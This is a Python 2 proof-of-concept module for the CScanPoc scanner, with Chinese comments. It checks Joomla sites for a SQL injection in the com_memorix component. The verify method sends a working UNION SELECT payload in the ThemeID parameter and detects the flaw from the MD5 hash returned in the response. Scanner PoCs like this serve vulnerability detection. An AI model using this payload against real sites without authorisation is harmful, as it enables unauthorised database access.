# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import urllib2

class Vuln(ABVuln):
    vuln_id = 'Joomla_0004'  # 平台漏洞编号，留空
    name = 'Joomla /index.php com_memorix SQL 注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2015-08-15'  # 漏洞公布时间
    desc = '''
        Normal user can inject sql query in the url which lead to read data from the database.
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = 'Joomla!'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = '7224bc64-80d9-4f67-b37d-9dbfcf1939c9'
    author = 'cscan'  # POC编写者
    create_date = '2018-05-03'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = ('/index.php?option=com_memorix&task=result&searchplugin=theme&'
                       'Itemid=60&ThemeID=-8594+union+select+111,222,MD5(1),444,555,66'
                       '6,777,888,999--+AbuHassan')
            verify_url = self.target + payload

            req = urllib2.urlopen(verify_url)
            content = req.read()
            if 'c4ca4238a0b923820dcc509a6f75849b' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
